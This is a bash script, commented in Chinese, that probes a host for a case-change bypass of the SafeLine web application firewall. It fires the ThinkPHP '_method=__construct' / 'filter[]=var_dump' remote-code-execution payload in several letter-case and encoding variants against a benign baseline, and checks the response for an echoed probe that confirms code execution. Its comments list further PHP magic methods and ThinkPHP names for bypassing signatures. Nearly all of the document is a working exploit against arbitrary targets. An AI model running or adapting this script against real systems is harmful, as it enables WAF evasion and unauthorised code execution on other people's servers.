#!/bin/bash
# SafeLine 403 定性 + 签名大小写绕过判别脚本（隔离矩阵）
# 关键前提：SafeLine 的拦截页文案是通用的 "The request frequency is too high"，
#           与频率无关 —— 必须同批带 benign 对照，否则无法区分「规则命中」与「限频惩罚」。
# 判别：benign 全程放行 + payload 第一个请求就 403 ⇒ 该 403 是签名规则命中。

# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./safeline_case_bypass.sh <HOST> [ROUTE]\n' >&2; exit 1; fi
H=$1              # 目标 host
ROUTE=${2:-/captcha}   # 任一可 POST 的路径（/zzz 也行，看目标）
S=${3:-15}        # 间隔秒数，>=15
UA='Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
run(){ curl -sk --max-time 25 -H "User-Agent: $UA" -H "Referer: https://$H/" -o /tmp/sl_$1 -X POST \
        --data-urlencode "$2" --data-urlencode 'filter[]=var_dump' --data-urlencode 'method=GET' \
        --data-urlencode 'server[REQUEST_METHOD]=f7e0b956540676a129760a3eae309294' \
        -w "$1: %{http_code} %{size_download}\n" "https://$H$ROUTE"; }

# 1) benign 基线（无 __construct）—— 必须放行，否则说明已进惩罚期，本轮结果作废
curl -sk --max-time 25 -H "User-Agent: $UA" -o /dev/null -X POST -d 'a=1' -w "baseline: %{http_code} %{size_download}\n" "https://$H$ROUTE"; sleep $S
# 2) 小写 __construct —— 期望 403（SafeLine 签名命中，322B 或 389B）
run lower '_method=__construct'; sleep $S
# 3) 大写 __CONSTRUCT —— 期望 404/6497 或 200（绕过成功）
run upper '_method=__CONSTRUCT'; sleep $S
# 4) 混合大小写
run mixed '_method=__ConstRuct'; sleep $S
# 5) URL 编码（SafeLine 会解码，通常无效）
run enc '_method=__constr%75ct'; sleep $S

# 判据：
#   baseline 200/404 放行 且 lower 403 且 upper 非 403  → 签名大小写敏感，绕过成立
#   upper 仍 403                                        → 该规则非字面匹配，换其它点
#   回显 grep 到 32 位探针（string(32) "f7e0b95..."）    → 属性污染生效，RCE 成立
grep -ao 'f7e0b956540676a129760a3eae309294\|string(32)' /tmp/sl_upper || echo 'NO-RCE-ECHO（应用层未执行）'

# 适用范围（通用）：凡 WAF 签名写成 PHP 方法名/魔术方法/类名的规则
#   __construct / __destruct / __wakeup / system / phpinfo / \think\App / invokefunction
#   把其中字母改大小写即可能穿过字面签名，而 PHP 名称解析大小写不敏感。
# 注意：`_method` 仅在目标 url_route_must=false 或存在 `*` 方法路由时才能走到 RCE；
#       route_must=true 的部署上配合 GET-only 的路由，404 是必然结果，不能据此判 patch。